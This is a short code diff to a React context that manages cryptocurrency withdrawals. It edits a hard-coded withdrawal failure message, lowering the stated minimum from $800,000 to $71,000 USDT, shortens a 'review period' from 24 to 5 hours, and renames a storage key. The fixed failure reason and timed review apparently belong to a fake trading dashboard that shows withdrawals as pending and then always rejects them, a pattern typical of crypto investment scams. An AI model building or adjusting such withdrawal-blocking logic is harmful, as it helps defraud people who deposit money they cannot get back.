@@ -1,9 +1,9 @@
 import { createContext, useContext, useState, useEffect, ReactNode } from "react";
 
 export const FAILURE_REASON =
-  "Minimum withdrawal on the dashboard is $800,000.00.";
+  "Minimum amount to be withdrawn from the dashboard is $71,000 USDT.";
 
-const REVIEW_PERIOD_MS = 24 * 60 * 60 * 1000;
+const REVIEW_PERIOD_MS = 5 * 60 * 60 * 1000;
 
 export interface WithdrawalTx {
   id: string;
@@ -24,7 +24,7 @@ interface WithdrawalContextType {
   clearAll: () => void;
 }
 
-const STORAGE_KEY = "crypto_withdrawals_v3";
+const STORAGE_KEY = "crypto_withdrawals_v4";
 
 const PRESEEDED: WithdrawalTx[] = [];
 
